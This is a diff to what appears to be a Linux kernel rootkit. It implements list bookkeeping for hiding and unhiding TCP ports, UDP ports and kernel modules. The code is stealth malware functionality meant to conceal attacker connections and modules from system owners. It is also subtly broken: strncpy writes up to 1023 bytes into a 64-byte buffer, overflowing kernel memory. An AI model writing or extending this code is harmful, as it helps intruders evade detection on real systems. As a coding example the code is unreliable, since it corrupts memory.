@@ -40,7 +40,7 @@ struct udp_socket {
 // TODO: think of a better way to store hidden modules
 struct modules {
 	struct list_head list;
-	char name[32];
+	char name[64];
 }; 
 
 static struct list_head paths;
@@ -164,7 +164,6 @@ unhide_file_prefix(char *name)
 		}
 	}
 
-	
 	return -EINVAL;
 }
 
@@ -242,13 +241,40 @@ is_tcp_socket_hidden(int port)
 int
 hide_tcp_socket(int port) 
 {
-	return -1;
+	struct tcp_socket *new;
+	
+	if(is_tcp_socket_hidden(port)) {
+		return -1;	// TODO: better error code
+	}
+
+	new = kmalloc(sizeof(struct tcp_socket), GFP_KERNEL);
+	if(new == NULL) {
+		return -ENOMEM;
+	}
+	
+	new->port = port;
+
+	list_add(&new->list, &tcp_sockets);
+	
+	return 0;
 }
 
 int
 unhide_tcp_socket(int port)
 {
-	return -1;
+	struct tcp_socket *cur;
+	struct list_head *cursor, *next;
+	list_for_each_safe(cursor, next, &tcp_sockets) {
+		cur = list_entry(cursor, struct tcp_socket, list);
+		if(cur->port == port) {
+			list_del(cursor);
+			kfree(cur);
+			return 0;
+		}
+	}
+
+	
+	return -EINVAL;
 }
 
 int
@@ -270,13 +296,40 @@ is_udp_socket_hidden(int port)
 int
 hide_udp_socket(int port)
 {
-	return -1;
+	struct udp_socket *new;
+	
+	if(is_udp_socket_hidden(port)) {
+		return -1;	// TODO: better error code
+	}
+
+	new = kmalloc(sizeof(struct udp_socket), GFP_KERNEL);
+	if(new == NULL) {
+		return -ENOMEM;
+	}
+	
+	new->port = port;
+
+	list_add(&new->list, &udp_sockets);
+	
+	return 0;
 }
 
 int
 unhide_udp_socket(int port)
 {
-	return -1;
+	struct udp_socket *cur;
+	struct list_head *cursor, *next;
+	list_for_each_safe(cursor, next, &udp_sockets) {
+		cur = list_entry(cursor, struct udp_socket, list);
+		if(cur->port == port) {
+			list_del(cursor);
+			kfree(cur);
+			return 0;
+		}
+	}
+
+	
+	return -EINVAL;
 }
 
 int
@@ -298,13 +351,47 @@ is_module_hidden(char *name)
 int
 hide_module(char *name)
 {
-	return -1;
+	// TODO actually hide the module
+
+	struct modules *new;
+
+	if(strlen(name) > 63) {
+		return -EINVAL;
+	}
+	
+	if(is_module_hidden(name)) {
+		return -1;	// TODO: better error code
+	}
+
+	new = kmalloc(sizeof(struct modules), GFP_KERNEL);
+	if(new == NULL) {
+		return -ENOMEM;
+	}
+	
+	strncpy(new->name, name, 1023);
+
+	list_add(&new->list, &modules);
+	
+	return 0;
 }
 
 int
 unhide_module(char *name)
 {
-	return -1;
+	// TODO actually unhide the module
+
+	struct modules *cur;
+	struct list_head *cursor, *next;
+	list_for_each_safe(cursor, next, &modules) {
+		cur = list_entry(cursor, struct modules, list);
+		if(strcmp(cur->name, name) == 0) {
+			list_del(cursor);
+			kfree(cur);
+			return 0;
+		}
+	}
+
+	return -EINVAL;
 }
 
 void
